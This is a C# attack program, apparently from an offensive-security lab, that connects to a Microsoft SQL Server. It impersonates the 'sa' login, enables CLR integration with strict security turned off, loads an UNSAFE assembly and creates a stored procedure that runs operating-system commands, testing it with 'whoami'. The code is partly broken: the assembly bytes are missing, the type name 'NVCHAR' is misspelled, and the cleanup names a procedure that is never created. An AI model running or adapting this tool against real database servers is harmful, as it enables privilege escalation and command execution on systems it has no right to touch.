using System;
using System.Data.SqlClient;

namespace MSSQL_relay
{
    class Program
    {
        static void Main
        (
            string[] args
        )
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //String dll = "";

            String cleanup = "DROP PROCEDURE dbo.execCommand; DROP ASSEMBLY myAssembly;";

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_clr = "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;"; ;
            String create_asm = "CREATE ASSEMBLY myAssembly FROM  WITH PERMISSION_SET = UNSAFE;";
            String create_procedure = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String exec_cmd = "EXEC cmdExec 'whoami';";

            SqlCommand command = new SqlCommand(cleanup, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(impersonateUser, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_clr, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(create_asm, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(create_procedure, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(exec_cmd, con);
            reader = command.ExecuteReader();
            reader.Close();


            con.Close();
        }
    }
}
